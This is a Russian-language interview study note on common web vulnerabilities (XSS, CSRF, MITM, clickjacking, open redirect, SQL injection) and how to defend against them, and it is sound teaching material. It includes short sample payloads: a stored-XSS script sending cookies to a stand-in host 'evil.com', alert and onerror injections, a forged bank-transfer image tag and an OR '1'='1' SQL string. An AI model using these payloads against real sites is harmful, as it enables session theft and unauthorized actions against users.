# Уязвимости в веб-приложениях

## Краткий ответ для собеседования

Основные уязвимости фронтенда: **XSS** (внедрение вредоносного JS через пользовательский ввод), **CSRF** (атака через подделку запросов), **MITM** (перехват трафика между клиентом и сервером). Защита: санитизация ввода, CSP, HTTPS, CSRF-токены, Same-Site cookies, валидация на сервере.

---

## XSS (Cross-Site Scripting)

### Что это

**XSS** — внедрение вредоносного JavaScript-кода в веб-страницу через **пользовательский ввод**.

**Принцип:**  
Атакующий вставляет JS-код в поле ввода → код выполняется в браузере жертвы → кража cookies, токенов, перенаправление.

---

### Типы XSS

#### 1. Reflected XSS (Отражённая)

Вредоносный код передаётся **через URL** или форму и **сразу отображается** на странице.

**Пример:**

```
https://example.com/search?q=<script>alert('XSS')</script>
```

Если сервер вставляет `q` в HTML без проверки:

```html
<h1>Результаты поиска: <script>alert('XSS')</script></h1>
```

→ Скрипт выполнится.

---

#### 2. Stored XSS (Хранимая)

Вредоносный код **сохраняется на сервере** (БД, комментарий) и выполняется у всех пользователей.

**Пример:**

```html
<!-- Комментарий в базе -->
<script>document.location='http://evil.com?cookie='+document.cookie</script>
```

Когда другие пользователи увидят комментарий → скрипт украдёт cookies.

---

#### 3. DOM-based XSS

Уязвимость **на стороне клиента** — JS изменяет DOM на основе пользовательского ввода.

**Пример:**

```js
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}`;
```

URL: `?name=<img src=x onerror=alert('XSS')>`  
→ Скрипт выполнится.

---

### Защита от XSS

#### 1. Санитизация (экранирование) ввода

**Экранировать** спецсимволы HTML:

```js
function escapeHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

#### 2. Использовать `textContent` вместо `innerHTML`

```js
// ❌ Опасно
element.innerHTML = userInput;

// ✅ Безопасно
element.textContent = userInput;
```

#### 3. CSP (Content Security Policy)

HTTP-заголовок, ограничивающий источники скриптов:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

→ Inline-скрипты (`<script>...</script>`) запрещены, только с доверенных доменов.

#### 4. Библиотеки (DOMPurify)

```js
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

#### 5. Валидация на сервере

Не доверять клиенту — валидировать и санитизировать на сервере.

---

## CSRF (Cross-Site Request Forgery)

### Что это

**CSRF** — атака, при которой злоумышленник **заставляет пользователя выполнить нежелательное действие** на сайте, где пользователь авторизован.

**Пример:**

1. Пользователь авторизован на `bank.com`
2. Заходит на злонамеренный сайт `evil.com`
3. `evil.com` отправляет запрос на `bank.com`:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

4. Браузер автоматически отправляет cookies → запрос выполняется от имени пользователя

---

### Защита от CSRF

#### 1. CSRF-токены

Сервер генерирует **уникальный токен** для каждой сессии/запроса:

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="abc123xyz">
  ...
</form>
```

Сервер проверяет токен → если нет или неверный, запрос отклоняется.

#### 2. SameSite Cookies

```
Set-Cookie: sessionId=abc123; SameSite=Strict
```

- `Strict` — cookies отправляются только на запросы с того же сайта
- `Lax` — cookies отправляются на GET, но не на POST с других сайтов

#### 3. Проверка Referer/Origin

Сервер проверяет заголовки `Referer` или `Origin` → запросы только с доверенных доменов.

#### 4. Double Submit Cookie

Токен в cookie + тот же токен в теле запроса → сервер сравнивает.

---

## MITM (Man-In-The-Middle)

### Что это

**MITM** — перехват и изменение трафика между клиентом и сервером.

**Сценарий:**

1. Пользователь подключается к публичному Wi-Fi
2. Атакующий перехватывает трафик
3. Читает/изменяет данные (пароли, токены)

---

### Виды атак MITM

#### 1. Перехват HTTP-трафика

HTTP — незашифрован → легко читается.

**Пример:**  
Пользователь вводит пароль на `http://example.com` → атакующий видит пароль.

#### 2. SSL Stripping

Атакующий **понижает HTTPS до HTTP** (перехватывает редирект `http→https`).

Пользователь думает, что на HTTPS, но на самом деле — HTTP.

#### 3. Фальшивый сертификат

Атакующий подставляет свой SSL-сертификат → перехватывает зашифрованный трафик.

---

### Защита от MITM

#### 1. HTTPS (обязательно)

**Все запросы через HTTPS** — шифрование трафика TLS.

#### 2. HSTS (HTTP Strict Transport Security)

HTTP-заголовок, заставляющий браузер **всегда использовать HTTPS**:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

→ Браузер автоматически перенаправляет HTTP → HTTPS, запрещает обход предупреждения о сертификате.

#### 3. Certificate Pinning

Приложение «запоминает» сертификат сервера → если сертификат изменился, соединение не устанавливается.

(Редко используется в вебе, чаще в мобильных приложениях.)

#### 4. Не использовать публичный Wi-Fi без VPN

VPN шифрует весь трафик → атакующий не может перехватить.

---

## Другие уязвимости

### Clickjacking

**Что это:**  
Сайт встраивается в `<iframe>` на злонамеренном сайте, поверх накладываются невидимые кнопки → пользователь кликает не туда, куда думает.

**Защита:**

```
X-Frame-Options: DENY
```

или CSP:

```
Content-Security-Policy: frame-ancestors 'none'
```

---

### Open Redirect

**Что это:**  
Перенаправление пользователя на вредоносный сайт через параметр URL:

```
https://example.com/redirect?url=http://evil.com
```

**Защита:**  
Валидировать URL перенаправления (whitelist доверенных доменов).

---

### SQL Injection (для сервера)

**Что это:**  
Внедрение SQL-кода через пользовательский ввод.

**Пример:**

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --
```

**Защита:**  
Использовать **параметризованные запросы** (prepared statements).

---

## Вопросы на собеседовании

| Вопрос | Краткий ответ |
|--------|----------------|
| Что такое XSS? | Внедрение вредоносного JS через пользовательский ввод |
| Типы XSS? | Reflected (отражённая), Stored (хранимая), DOM-based |
| Как защититься от XSS? | Санитизация ввода, `textContent`, CSP, DOMPurify, валидация на сервере |
| Что такое CSRF? | Подделка запросов от имени авторизованного пользователя |
| Как защититься от CSRF? | CSRF-токены, SameSite cookies, проверка Referer/Origin |
| Что такое MITM? | Перехват и изменение трафика между клиентом и сервером |
| Как защититься от MITM? | HTTPS, HSTS, Certificate Pinning, VPN |
| Что такое CSP? | Content Security Policy — HTTP-заголовок, ограничивающий источники скриптов |
| Что такое HSTS? | HTTP Strict Transport Security — принудительное HTTPS |

---

## Кратко для ответа

**XSS** — внедрение JS через пользовательский ввод; защита: санитизация, CSP, `textContent`. **CSRF** — подделка запросов от авторизованного пользователя; защита: CSRF-токены, SameSite cookies. **MITM** — перехват трафика; защита: HTTPS, HSTS. Другие: Clickjacking (X-Frame-Options), Open Redirect (валидация URL).
